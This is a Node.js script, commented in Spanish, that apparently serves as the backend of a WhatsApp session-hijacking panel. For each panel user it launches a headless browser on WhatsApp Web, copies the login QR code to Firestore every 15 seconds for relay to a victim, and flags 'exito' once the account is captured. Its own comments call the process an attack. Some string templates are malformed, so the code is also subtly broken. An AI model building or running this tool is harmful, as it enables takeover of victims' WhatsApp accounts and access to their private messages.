const puppeteer = require('puppeteer');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json");

if (!admin.apps.length) {
    admin.initializeApp({
        credential: admin.credential.cert(serviceAccount)
    });
}
const db = admin.firestore();

// MAPA PARA CONTROLAR MÚLTIPLES NAVEGADORES
const sesionesActivas = new Map();

async function iniciarMotorMultiusuario() {
    console.log("[*] Buscando usuarios con ataque de WhatsApp activo...");

    // Escuchamos la colección panelUsers buscando quién tiene 'wa_active: true'
    // O simplemente escuchamos a todos los usuarios registrados
    db.collection("panelUsers").onSnapshot(async (snap) => {
        snap.forEach(async (doc) => {
            const userId = doc.id;
            const userData = doc.data();

            // Solo iniciamos el motor si el usuario NO tiene ya uno corriendo
            if (!sesionesActivas.has(userId)) {
                console.log([+] Iniciando robot para usuario: ${userId});
                lanzarNavegadorParaUsuario(userId);
            }
        });
    });
}

async function lanzarNavegadorParaUsuario(uid) {
    try {
        const browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
        });
        
        sesionesActivas.set(uid, browser);
        const page = await browser.newPage();
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36');
        
        await page.goto('https://web.whatsapp.com', { waitUntil: 'networkidle2', timeout: 0 });

        setInterval(async () => {
            try {
                const qrCanvas = await page.$('canvas');
                if (qrCanvas) {
                    const qrData = await page.evaluate(() => {
                        const canvas = document.querySelector('canvas');
                        return canvas ? canvas.toDataURL() : null;
                    });

                    if (qrData) {
                        // Guardamos el QR en la carpeta de ese usuario específico
                        await db.collection("whatsapp_sessions").doc(uid).set({
                            qrCode: qrData,
                            status: "esperando",
                            lastUpdate: admin.firestore.FieldValue.serverTimestamp()
                        }, { merge: true });
                    }
                }

                const loggedIn = await page.$('header span[data-icon="chat"]');
                if (loggedIn) {
                    await db.collection("whatsapp_sessions").doc(uid).update({ status: "exito" });
                }
            } catch (e) { }
        }, 15000);

    } catch (err) {
        console.error(Error en robot de ${uid}:, err);
    }
}

// SERVIDOR DE SALUD PARA RENDER
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('SISTEMA MULTI-USUARIO ONLINE\n');
}).listen(port, () => {
    iniciarMotorMultiusuario();
});
